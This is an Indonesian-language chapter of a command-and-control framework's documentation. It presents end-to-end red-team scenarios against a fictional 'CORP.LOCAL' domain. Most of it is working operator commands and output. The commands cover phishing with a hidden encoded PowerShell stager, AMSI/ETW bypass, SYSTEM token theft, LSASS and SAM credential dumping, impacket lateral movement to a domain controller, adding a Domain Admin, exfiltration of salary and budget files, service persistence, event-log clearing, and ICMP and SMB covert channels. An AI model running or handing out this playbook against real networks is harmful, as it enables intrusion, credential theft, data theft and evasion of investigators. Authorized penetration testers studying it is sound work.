# 16 — Red Team Scenarios

> Skenario end-to-end yang menggabungkan semua teknik dalam konteks engagement nyata.
> **Hanya untuk authorized penetration testing dengan izin tertulis.**

---

## Skenario 1: Initial Access via Phishing → Domain Dominance

### Context

```
Target    : CORP.LOCAL (medium-sized enterprise, ~500 users)
Objective : Domain Admin, exfil dokumen keuangan
Initial   : Phishing email ke john.doe@corp.local
```

### Fase 1: Initial Access

```bash
# Build agent stealth untuk engagement
make agent-win-stealth \
  C2_SERVER=https://updates.cdn-corp.com \
  ENC_KEY=EnterpriseC2Key2026 \
  INTERVAL=60 \
  JITTER=25 \
  KILL_DATE=2026-06-30 \
  EXEC_METHOD=powershell

# Upload ke stage server
./bin/operator stage upload ./bin/agent_windows_stealth.exe \
  --server https://updates.cdn-corp.com \
  --format exe --ttl 48 --desc "phase1"

# Generate stager PowerShell + kirim via phishing
go run ./cmd/generate stager \
  --server https://updates.cdn-corp.com \
  --token TOKEN --key EnterpriseC2Key2026 \
  --format ps1 --output delivery/stager.ps1

# One-liner phishing (email body):
# powershell -w hidden -enc <BASE64_STAGER>
```

### Fase 2: Situational Awareness

```
agents list
# 2703886d  DESKTOP-QLPBF95  john.doe  windows  online  8s ago

cmd 2703886d "whoami /all" --wait
# CORP\john.doe — member of: CORP\Domain Users, BUILTIN\Administrators ← admin lokal!

cmd 2703886d "systeminfo" --wait
# Domain: CORP.LOCAL, Logon Server: \\DC01

cmd 2703886d "nltest /dclist:corp.local" --wait
# DC01.corp.local [PDC]  [DS] Site: Default-First-Site-Name

cmd 2703886d "ipconfig /all" --wait
# 192.168.1.105, DNS: 192.168.1.100 (DC01)
```

### Fase 3: Evasion

```
bypass amsi   2703886d --wait
bypass etw    2703886d --wait
evasion unhook 2703886d --wait
evasion sleep  2703886d --duration 60 --wait

opsec antidebug 2703886d --wait
# [+] CLEAR — tidak terdeteksi debugger
```

### Fase 4: Privilege Escalation

```
# John punya SeDebugPrivilege sebagai admin lokal
cmd 2703886d "whoami /priv" --wait

token list 2703886d --wait
# PID 724 lsass.exe — SYSTEM

token steal 2703886d --pid 724 --wait
# [+] Impersonating: NT AUTHORITY\SYSTEM

cmd 2703886d "whoami"
# NT AUTHORITY\SYSTEM ✓
```

### Fase 5: Credential Access

```
# LSASS dump
creds lsass 2703886d --output "C:\Windows\Temp\wer1234.dmp" --wait
files download 2703886d "C:\Windows\Temp\wer1234.dmp" ./loot/lsass.dmp --timeout 120 --wait
files delete   2703886d "C:\Windows\Temp\wer1234.dmp" --wait

# SAM dump
creds sam 2703886d --output-dir "C:\Windows\Temp" --wait
files download 2703886d "C:\Windows\Temp\sam.hive" ./loot/sam.hive --wait
files download 2703886d "C:\Windows\Temp\system.hive" ./loot/system.hive --wait
files download 2703886d "C:\Windows\Temp\security.hive" ./loot/security.hive --wait

# Analisis di operator
pypykatz lsa minidump ./loot/lsass.dmp 2>/dev/null | grep -E "(Username|NT:|password)"
# NT: e10adc3949ba59abbe56e057f20f883e (john.doe)
# NT: 8d3a20e88df4e3a2c74f8f47e3ac36d7 (Administrator)  ← admin domain!
# password: EnterpriseAdmin@2026! (Administrator, cleartext via wdigest)
```

### Fase 6: Network Discovery

```
netscan 2703886d --targets 192.168.1.0/24 --ports 445,3389,5985,88,389 --wait
# 192.168.1.100  445 OPEN   [SMB] DC01 (Windows Server 2022)
# 192.168.1.50   445 OPEN   [SMB] FILESERVER-01 (Windows Server 2022)
# 192.168.1.60   3389 OPEN  CORP-MGMT-01
# 192.168.1.200  22 OPEN    SSH-2.0-OpenSSH_8.9p1 (Linux box)
```

### Fase 7: Lateral Movement ke DC

```
# Start SOCKS5 di agent pertama
socks5 start 2703886d --wait

# Dari operator, gunakan credential Administrator yang didapat
proxychains python3 -m impacket.examples.secretsdump \
  CORP/Administrator:EnterpriseAdmin@2026!@192.168.1.100

# secretsdump berhasil — dump semua akun domain
# Administrator:500:aad3b435:31d6cfe0:::
# krbtgt:502:aad3b435:a9f7e5dc3b8f2c1e:::
# ...

# Deploy agent ke DC
proxychains python3 -m impacket.examples.psexec \
  CORP/Administrator:EnterpriseAdmin@2026!@192.168.1.100 \
  "powershell -w hidden -ep bypass -enc <STAGER_B64>"
```

```
agents list
# 2703886d  DESKTOP-QLPBF95  john.doe      online  12s ago
# 9c821d77  DC01             NT AUTHORITY\SYSTEM  online  5s ago  ← DA!
```

### Fase 8: Domain Dominance

```
# Di agent DC01 (9c821d77)
cmd 9c821d77 "net group 'Domain Admins' /add john.doe /domain" --wait
# [+] john.doe ditambahkan ke Domain Admins

# DCSync via secretsdump
proxychains python3 -m impacket.examples.secretsdump \
  CORP/john.doe:CorpMail@2026!@192.168.1.100 -just-dc-ntlm

# Semua NT hash domain berhasil di-dump
```

### Fase 9: Exfiltration Dokumen Keuangan

```
cmd 2703886d \
  "Get-ChildItem \\FILESERVER-01\Finance$ -Recurse -Include *.xlsx,*.pdf | Select FullName" \
  --method powershell --timeout 60 --wait

files download 2703886d "\\FILESERVER-01\Finance$\Q1_2026_Budget.xlsx" ./loot/budget.xlsx --wait
files download 2703886d "\\FILESERVER-01\Finance$\Salary_Data_2026.xlsx" ./loot/salary.xlsx --wait
```

### Fase 10: Persistence dan Clean Up

```
# Persistence di DC (survive reboot)
persistence setup 9c821d77 --method service --name "WinHTTPSvc" --wait

# Set timegate
opsec timegate 2703886d --work-start 8 --work-end 18 --kill-date 2026-06-30 --wait
opsec timegate 9c821d77 --work-start 8 --work-end 18 --kill-date 2026-06-30 --wait

# Clear event logs
cmd 9c821d77 "wevtutil cl Security" --wait
cmd 9c821d77 "wevtutil cl System" --wait
cmd 9c821d77 "wevtutil cl 'Windows PowerShell'" --wait
```

---

## Skenario 2: Physical Access → Covert Channel via ICMP

### Context

```
Target  : Air-gapped adjacent network (sangat restricted egress)
Situasi : Koneksi TCP keluar diblokir, hanya ICMP diizinkan
Agent   : Build dengan transport ICMP
```

```bash
# Build agent ICMP
make agent-win-icmp \
  C2_SERVER=203.0.113.50 \
  ENC_KEY=IcmpC2Key2026 \
  TRANSPORT=icmp \
  INTERVAL=120 \
  JITTER=30

# Jalankan server dengan ICMP listener (butuh root)
sudo ENCRYPTION_KEY=IcmpC2Key2026 ./bin/server --port 8000

# Deploy agent ke target (via USB/physical)
# Agent beacon via ICMP echo ke 203.0.113.50
```

```
agents list
# 5a3b1c9d  TARGET-AIRGAP  SYSTEM  windows  online  125s ago

# Operasi normal melalui ICMP channel
cmd 5a3b1c9d "ipconfig" --wait
files download 5a3b1c9d "C:\Sensitive\data.db" ./loot/data.db --wait
```

---

## Skenario 3: Internal Network Agent → SMB Pivot

### Context

```
Situasi : Agent di internal host tidak punya akses internet langsung
          Tapi ada mesin relay di DMZ yang bisa SMB ke internal
Solution: Agent gunakan SMB named pipe, relay proxy ke C2 internet
```

```bash
# Build SMB relay binary (deploy di DMZ host)
make smb-relay SMB_PIPE=svcctl

# Deploy relay di DMZ host (bisa akses 10.10.5.0/24 dan internet)
.\smb_relay.exe --pipe svcctl --c2 https://c2.yourdomain.com --key K3yRah4sia

# Build agent dengan SMB transport untuk internal host
make agent-win-smb \
  ENC_KEY=K3yRah4sia \
  TRANSPORT=smb \
  SMB_RELAY=10.10.5.20 \  # IP DMZ relay host
  SMB_PIPE=svcctl
```

```
# Agent internal beacon ke relay via SMB
# Relay forward ke C2 internet
agents list
# 7f2a3b4c  INTERNAL-HOST-01  svc_account  windows  online  35s ago
```

---

## Skenario 4: Multi-Operator Koordinasi

### Context

```
Tim: Alice (operator senior), Bob (operator junior)
Task: Alice handling DC, Bob handling workstations
```

```bash
# Terminal Alice
./bin/operator team subscribe --name "Alice" --server https://c2.corp.local

# Terminal Bob
./bin/operator team subscribe --name "Bob" --server https://c2.corp.local
```

**Alice melihat event stream:**
```
[2026-04-23 09:05:01] AGENT_CHECKIN  agent=2703886d host=DESKTOP-QLPBF95 ip=192.168.1.105
[2026-04-23 09:07:12] AGENT_CHECKIN  agent=9c821d77 host=DC01 ip=192.168.1.100
```

```bash
# Alice claim DC01
./bin/operator team claim 9c821d77 \
  --session alice-session-abc \
  --server https://c2.corp.local

# Bob claim workstation
./bin/operator team claim 2703886d \
  --session bob-session-xyz \
  --server https://c2.corp.local
```

```
# Bob coba kirim perintah ke DC01 → ditolak
./bin/operator cmd 9c821d77 "whoami"
# [!] 409 Conflict: agent 9c821d77 is claimed by Alice — release it first
```

```
# Alice selesai, release
./bin/operator team release 9c821d77 --session alice-session-abc
# [+] Agent 9c821d77 released.

# Sekarang Bob bisa akses
./bin/operator cmd 9c821d77 "whoami"
# [+] NT AUTHORITY\SYSTEM
```

---

**Selanjutnya:** [17 — Malleable Profiles](17-profiles.md)
